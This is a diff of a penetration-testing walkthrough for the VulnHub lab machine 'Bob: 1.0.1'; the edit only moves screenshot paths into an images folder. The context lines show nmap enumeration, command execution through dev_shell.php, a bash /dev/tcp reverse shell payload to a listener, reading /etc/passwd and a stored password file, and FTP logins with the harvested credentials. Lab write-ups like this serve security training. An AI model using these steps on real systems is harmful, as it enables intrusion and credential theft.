@@ -3,7 +3,7 @@
 - **Machine:** Bob: 1.0.1
 - **Download:** https://www.vulnhub.com/entry/bob-101,226/
 
-![](680-1.png)
+![](images/680-1.png)
 
 ---
 
@@ -23,7 +23,7 @@
 nmap -sn 192.168.31.0/24
 ```
 
-![](680-2.png)
+![](images/680-2.png)
 
 ---
 
@@ -33,7 +33,7 @@ nmap -sn 192.168.31.0/24
 nmap -v -p- 192.168.31.228
 ```
 
-![](680-3.png)
+![](images/680-3.png)
 
 ---
 
@@ -43,7 +43,7 @@ nmap -v -p- 192.168.31.228
 nmap -sC -sV -A 192.168.31.228
 ```
 
-![](680-4.png)
+![](images/680-4.png)
 
 ---
 
@@ -59,7 +59,7 @@ Run an aggressive Nmap scan with the `http-enum` NSE script to discover hidden w
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.31.228
 ```
 
-![](680-5.png)
+![](images/680-5.png)
 
 ---
 
@@ -71,11 +71,11 @@ The following endpoints were discovered during enumeration:
 
 - http://192.168.31.228/robots.txt
 
-![](680-6.png)
+![](images/680-6.png)
 
 - http://192.168.31.228/login.html
 
-![](680-7.png)
+![](images/680-7.png)
 
 - http://192.168.31.228/passwords.html
 - http://192.168.31.228/dev_shell.php
@@ -91,7 +91,7 @@ The `robots.txt` file reveals an interesting endpoint.
 /dev_shell.php
 ```
 
-![](680-8.png)
+![](images/680-8.png)
 
 Open the page in a browser:
 
@@ -99,7 +99,7 @@ Open the page in a browser:
 http://192.168.31.228/dev_shell.php
 ```
 
-![](680-9.png)
+![](images/680-9.png)
 
 ---
 
@@ -111,7 +111,7 @@ Execute a simple command to verify whether the page allows operating system comm
 id
 ```
 
-![](680-10.png)
+![](images/680-10.png)
 
 Check the network configuration.
 
@@ -119,7 +119,7 @@ Check the network configuration.
 ip a
 ```
 
-![](680-11.png)
+![](images/680-11.png)
 
 The successful output confirms that arbitrary commands can be executed on the target.
 
@@ -145,11 +145,11 @@ Execute the following payload through the `dev_shell.php` input field.
 bash -c 'bash -i >& /dev/tcp/192.168.31.206/4444 0>&1'
 ```
 
-![](680-12.png)
+![](images/680-12.png)
 
 A reverse shell is received on the listener.
 
-![](680-13.png)
+![](images/680-13.png)
 
 ---
 
@@ -163,7 +163,7 @@ Display the local user accounts.
 cat /etc/passwd
 ```
 
-![](680-14.png)
+![](images/680-14.png)
 
 Three local users are identified.
 
@@ -183,7 +183,7 @@ ls -la /home/seb
 ls -la /home/bob
 ```
 
-![](680-15.png)
+![](images/680-15.png)
 
 An interesting password file is discovered.
 
@@ -195,7 +195,7 @@ An interesting password file is discovered.
 cat /home/bob/.old_passwordfile.html
 ```
 
-![](680-16.png)
+![](images/680-16.png)
 
 ### Credentials Discovered
 
@@ -216,11 +216,11 @@ ftp 192.168.31.228
 
 Login using the discovered credentials.
 
-![](680-17.png)
+![](images/680-17.png)
 
 Successful FTP login as **seb**.
 
-![](680-18.png)
+![](images/680-18.png)
 
 Successful FTP login as **jc**.
 
